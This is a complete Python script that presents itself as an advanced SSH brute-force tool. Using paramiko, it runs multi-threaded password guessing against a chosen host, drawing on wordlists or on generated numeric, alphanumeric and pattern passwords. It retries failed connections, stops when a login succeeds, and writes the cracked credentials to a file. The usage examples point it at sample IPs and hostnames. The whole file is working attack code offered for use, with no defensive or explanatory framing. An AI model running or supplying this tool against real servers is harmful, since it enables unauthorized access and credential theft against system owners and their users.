#!/usr/bin/env python3
"""
Advanced SSH Brute-Force Tool
Supports username lists, password lists, password generation, multi-threading, and retry mechanisms.
"""

import paramiko
import argparse
import sys
import time
import threading
import queue
import itertools
import string
import socket
from typing import List, Optional, Tuple, Generator


class PasswordGenerator:
    """Generate passwords dynamically based on patterns."""
    
    @staticmethod
    def generate_numeric(length: int, start: int = 0, end: int = None) -> Generator[str, None, None]:
        """
        Generate numeric passwords.
        
        Args:
            length: Password length
            start: Starting number
            end: Ending number (None for unlimited)
        """
        if end is None:
            end = 10 ** length - 1
        
        for num in range(start, min(end + 1, 10 ** length)):
            yield str(num).zfill(length)
    
    @staticmethod
    def generate_alpha_numeric(length: int, charset: str = None) -> Generator[str, None, None]:
        """
        Generate alphanumeric passwords.
        
        Args:
            length: Password length
            charset: Character set to use (default: lowercase + digits)
        """
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)
    
    @staticmethod
    def generate_from_pattern(pattern: str) -> Generator[str, None, None]:
        """
        Generate passwords from a pattern.
        %d = digit, %a = lowercase letter, %A = uppercase letter, %s = special char
        
        Args:
            pattern: Pattern string (e.g., "pass%d%d" generates pass00, pass01, etc.)
        """
        # Simple pattern replacement
        if '%d' in pattern:
            # Replace %d with digits
            digit_count = pattern.count('%d')
            for num in range(10 ** digit_count):
                num_str = str(num).zfill(digit_count)
                password = pattern
                for _ in range(digit_count):
                    password = password.replace('%d', num_str[0], 1)
                    num_str = num_str[1:]
                yield password
        else:
            yield pattern


class AdvancedSSHBruteForcer:
    """Advanced SSH brute-force tool with multi-threading support."""
    
    def __init__(self, hostname: str, port: int = 22, timeout: int = 10, 
                 max_retries: int = 3, retry_delay: int = 2, threads: int = 5):
        """
        Initialize the advanced SSH brute-forcer.
        
        Args:
            hostname: Target SSH server hostname or IP
            port: SSH port (default: 22)
            timeout: Connection timeout in seconds (default: 10)
            max_retries: Maximum retry attempts for failed connections (default: 3)
            retry_delay: Delay between retries in seconds (default: 2)
            threads: Number of threads to use (default: 5)
        """
        self.hostname = hostname
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.threads = threads
        self.found_credentials = []
        self.credentials_lock = threading.Lock()
        self.attempted_count = 0
        self.count_lock = threading.Lock()
        self.stop_flag = threading.Event()
        self.credential_queue = queue.Queue()
    
    def test_connection(self, username: str, password: str) -> bool:
        """
        Test SSH connection with given credentials.
        
        Args:
            username: SSH username
            password: SSH password
            
        Returns:
            True if connection successful, False otherwise
        """
        ssh_client = None
        for attempt in range(self.max_retries):
            if self.stop_flag.is_set():
                return False
                
            try:
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                ssh_client.connect(
                    hostname=self.hostname,
                    port=self.port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                # Connection successful
                with self.credentials_lock:
                    if (username, password) not in self.found_credentials:
                        self.found_credentials.append((username, password))
                        print(f"\n[+] SUCCESS! Username: {username}, Password: {password}\n")
                
                self.stop_flag.set()  # Stop other threads
                return True
                
            except paramiko.AuthenticationException:
                # Authentication failed - wrong password
                return False
                
            except (paramiko.SSHException, socket.error, OSError, Exception) as e:
                # Network error or SSH error - retry
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay)
                else:
                    return False
                    
            finally:
                if ssh_client:
                    try:
                        ssh_client.close()
                    except:
                        pass
        
        return False
    
    def worker_thread(self):
        """Worker thread function to process credential combinations."""
        while not self.stop_flag.is_set():
            try:
                username, password = self.credential_queue.get(timeout=1)
            except queue.Empty:
                continue
            
            if self.stop_flag.is_set():
                break
            
            # Update attempt counter
            with self.count_lock:
                self.attempted_count += 1
                count = self.attempted_count
            
            print(f"[{count}] Trying {username}:{password}", end='\r')
            
            if self.test_connection(username, password):
                self.credential_queue.task_done()
                break
            
            self.credential_queue.task_done()
            time.sleep(0.05)  # Small delay to avoid overwhelming the server
    
    def brute_force(self, usernames: List[str], passwords: List[str]) -> List[Tuple[str, str]]:
        """
        Brute-force SSH with username and password lists using multi-threading.
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to try
            
        Returns:
            List of found (username, password) tuples
        """
        print(f"[*] Starting advanced brute-force attack on {self.hostname}:{self.port}")
        print(f"[*] Usernames: {len(usernames)}")
        print(f"[*] Passwords: {len(passwords)}")
        print(f"[*] Total combinations: {len(usernames) * len(passwords)}")
        print(f"[*] Threads: {self.threads}")
        print("-" * 60)
        
        # Fill queue with all combinations
        for username in usernames:
            for password in passwords:
                if not self.stop_flag.is_set():
                    self.credential_queue.put((username, password))
        
        # Start worker threads
        thread_list = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.worker_thread, daemon=True)
            thread.start()
            thread_list.append(thread)
        
        # Wait for queue to be processed or stop flag
        try:
            self.credential_queue.join()
        except KeyboardInterrupt:
            print("\n[*] Interrupted by user. Stopping...")
            self.stop_flag.set()
        
        # Wait for threads to finish
        for thread in thread_list:
            thread.join(timeout=2)
        
        print("\n" + "-" * 60)
        if self.found_credentials:
            print(f"[+] Brute-force attack completed. Found {len(self.found_credentials)} valid credential(s).")
        else:
            print("[*] Brute-force attack completed. No valid credentials found.")
        
        return self.found_credentials
    
    def save_credentials(self, output_file: str = "found_credentials.txt"):
        """
        Save found credentials to a file.
        
        Args:
            output_file: Output filename
        """
        if not self.found_credentials:
            print("[*] No credentials to save.")
            return
        
        try:
            with open(output_file, 'w') as f:
                for username, password in self.found_credentials:
                    f.write(f"{username}:{password}\n")
            print(f"[+] Credentials saved to {output_file}")
        except Exception as e:
            print(f"[-] Error saving credentials: {str(e)}")


def load_list(filename: str) -> List[str]:
    """
    Load items from a file.
    
    Args:
        filename: Path to file
        
    Returns:
        List of items
    """
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            items = [line.strip() for line in f if line.strip()]
        return items
    except FileNotFoundError:
        print(f"[-] Error: File '{filename}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading file: {str(e)}")
        sys.exit(1)


def generate_passwords_from_config(config: dict) -> List[str]:
    """
    Generate passwords based on configuration.
    
    Args:
        config: Dictionary with generation settings
        
    Returns:
        List of generated passwords
    """
    passwords = []
    generator = PasswordGenerator()
    
    # Numeric passwords
    if config.get('numeric'):
        length = config.get('numeric_length', 4)
        start = config.get('numeric_start', 0)
        end = config.get('numeric_end', None)
        limit = config.get('numeric_limit', 10000)
        
        count = 0
        for pwd in generator.generate_numeric(length, start, end):
            if count >= limit:
                break
            passwords.append(pwd)
            count += 1
    
    # Alphanumeric passwords
    if config.get('alphanumeric'):
        length = config.get('alphanumeric_length', 4)
        limit = config.get('alphanumeric_limit', 1000)
        
        count = 0
        for pwd in generator.generate_alpha_numeric(length):
            if count >= limit:
                break
            passwords.append(pwd)
            count += 1
    
    # Pattern-based passwords
    if config.get('pattern'):
        pattern = config['pattern']
        limit = config.get('pattern_limit', 10000)
        
        count = 0
        for pwd in generator.generate_from_pattern(pattern):
            if count >= limit:
                break
            passwords.append(pwd)
            count += 1
    
    return passwords


def main():
    """Main function to run the advanced SSH brute-force tool."""
    parser = argparse.ArgumentParser(
        description="Advanced SSH Brute-Force Tool with Multi-threading",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Using username and password lists
  python advance_ssh_brute.py -H 192.168.1.100 -U usernames.txt -P passwords.txt
  
  # Using single username with password list
  python advance_ssh_brute.py -H example.com -u admin -P wordlist.txt -t 10
  
  # Generate numeric passwords (4 digits, 0000-9999)
  python advance_ssh_brute.py -H 192.168.1.100 -u root --numeric --numeric-length 4
  
  # Generate alphanumeric passwords
  python advance_ssh_brute.py -H 192.168.1.100 -U users.txt --alphanumeric --alphanumeric-length 3
        """
    )
    
    # Target options
    parser.add_argument('-H', '--host', required=True, help='Target SSH hostname or IP address')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
    
    # Username options
    username_group = parser.add_mutually_exclusive_group(required=True)
    username_group.add_argument('-u', '--username', help='Single username to test')
    username_group.add_argument('-U', '--usernames', help='Path to username list file')
    
    # Password options
    password_group = parser.add_argument_group('Password Options')
    password_group.add_argument('-P', '--passwords', help='Path to password list file')
    
    # Password generation options
    password_group.add_argument('--numeric', action='store_true', help='Generate numeric passwords')
    password_group.add_argument('--numeric-length', type=int, default=4, help='Length of numeric passwords (default: 4)')
    password_group.add_argument('--numeric-start', type=int, default=0, help='Starting number (default: 0)')
    password_group.add_argument('--numeric-end', type=int, help='Ending number (default: unlimited)')
    password_group.add_argument('--numeric-limit', type=int, default=10000, help='Limit number of numeric passwords (default: 10000)')
    
    password_group.add_argument('--alphanumeric', action='store_true', help='Generate alphanumeric passwords')
    password_group.add_argument('--alphanumeric-length', type=int, default=4, help='Length of alphanumeric passwords (default: 4)')
    password_group.add_argument('--alphanumeric-limit', type=int, default=1000, help='Limit number of alphanumeric passwords (default: 1000)')
    
    password_group.add_argument('--pattern', help='Generate passwords from pattern (e.g., "pass%d%d" for pass00, pass01, etc.)')
    password_group.add_argument('--pattern-limit', type=int, default=10000, help='Limit number of pattern passwords (default: 10000)')
    
    # Connection options
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Connection timeout in seconds (default: 10)')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Maximum retry attempts (default: 3)')
    parser.add_argument('-d', '--delay', type=int, default=2, help='Retry delay in seconds (default: 2)')
    
    # Threading options
    parser.add_argument('-T', '--threads', type=int, default=5, help='Number of threads to use (default: 5)')
    
    # Output options
    parser.add_argument('-o', '--output', default='found_credentials.txt', help='Output file for found credentials (default: found_credentials.txt)')
    
    args = parser.parse_args()
    
    # Load usernames
    if args.username:
        usernames = [args.username]
    else:
        print(f"[*] Loading username list from {args.usernames}...")
        usernames = load_list(args.usernames)
    
    if not usernames:
        print("[-] Error: No usernames to test.")
        sys.exit(1)
    
    # Load or generate passwords
    passwords = []
    
    if args.passwords:
        print(f"[*] Loading password list from {args.passwords}...")
        passwords.extend(load_list(args.passwords))
    
    # Generate passwords if requested
    gen_config = {}
    if args.numeric:
        gen_config['numeric'] = True
        gen_config['numeric_length'] = args.numeric_length
        gen_config['numeric_start'] = args.numeric_start
        gen_config['numeric_end'] = args.numeric_end
        gen_config['numeric_limit'] = args.numeric_limit
    
    if args.alphanumeric:
        gen_config['alphanumeric'] = True
        gen_config['alphanumeric_length'] = args.alphanumeric_length
        gen_config['alphanumeric_limit'] = args.alphanumeric_limit
    
    if args.pattern:
        gen_config['pattern'] = args.pattern
        gen_config['pattern_limit'] = args.pattern_limit
    
    if gen_config:
        print("[*] Generating passwords...")
        generated = generate_passwords_from_config(gen_config)
        passwords.extend(generated)
        print(f"[*] Generated {len(generated)} passwords.")
    
    if not passwords:
        print("[-] Error: No passwords to test. Provide a password list or enable password generation.")
        sys.exit(1)
    
    # Remove duplicates while preserving order
    passwords = list(dict.fromkeys(passwords))
    
    # Initialize brute-forcer
    brute_forcer = AdvancedSSHBruteForcer(
        hostname=args.host,
        port=args.port,
        timeout=args.timeout,
        max_retries=args.retries,
        retry_delay=args.delay,
        threads=args.threads
    )
    
    # Start brute-force attack
    try:
        results = brute_forcer.brute_force(usernames, passwords)
        
        # Save credentials if found
        if results:
            brute_forcer.save_credentials(args.output)
            sys.exit(0)
        else:
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")
        if brute_forcer.found_credentials:
            brute_forcer.save_credentials(args.output)
        sys.exit(1)


if __name__ == "__main__":
    main()

